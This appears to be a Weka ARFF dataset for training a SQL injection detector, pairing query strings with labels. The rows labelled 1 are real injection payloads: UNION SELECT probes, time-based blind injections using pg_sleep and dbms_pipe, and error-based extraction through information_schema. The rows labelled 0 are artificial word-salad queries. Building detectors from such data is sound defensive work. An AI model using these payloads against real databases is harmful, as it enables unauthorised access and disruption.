@relation iris-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute Query string
@attribute Label {1,0}

@data
'\"-9725\"  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--\"',1
'\"1\"\" where 1051  =  1051 union all select null--\"',1
'\"1\"\"   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  \"\"fpkm\"\" like \"\"fpkm\"',1
'\"1\",  (  case when 5204  =  2136 then 1 else null end  )  \"',1
'\"1\"  )   where 1027  =  1027 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --\"',1
'\"1\"  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  \"vxqs\"  =  \"vxqs\"',1
'\"-2225\" union all select 1545,1545,1545,1545#\"',1
'\"1\" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --\"',1
'\"1\%\"\"   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   \"\"\%\"\"  =  \"\"\"',1
'\"1\%\" union all select null,null,null,null,null,null,null--\"',1
'-8410\"   )    )     )   or 8571  =  8571--',1
'\"1\"\"   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  \"\"zgoy\"\" like \"\"zgoy\"',1
'-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --',1
'\"1\"+  (  select ttae where 4601  =  4601 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +\"\"',1
'SELECT * FROM divide WHERE went = "selection" LIMIT 3',0
'SELECT * FROM nearby WHERE closely BETWEEN several09/01/1996kind AND muscle15/31/1996relationship',0
'SELECT * FROM ten WHERE corn BETWEEN \"1996-07-01\" AND \"1996-07-31\"',0
'SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ) ',0
'SELECT COUNT ( keep )  FROM musical',0
'SELECT COUNT ( simplestID ) FROM here',0
'SELECT AVG ( Price ) FROM his',0
'SELECT * FROM expect WHERE ought BETWEEN \"1996-07-01\" AND \"1996-07-31\"',0
'SELECT * FROM product  WHERE orange = sudden',0
'SELECT * FROM rice WHERE recall = \"very\"  AND City = \"section\"',0
'SELECT * FROM dig WHERE danger = \"son\"  OR court = \"balance\"',0
'SELECT * FROM seed WHERE idea = \"contain\"  OR continued = \"science\"',0
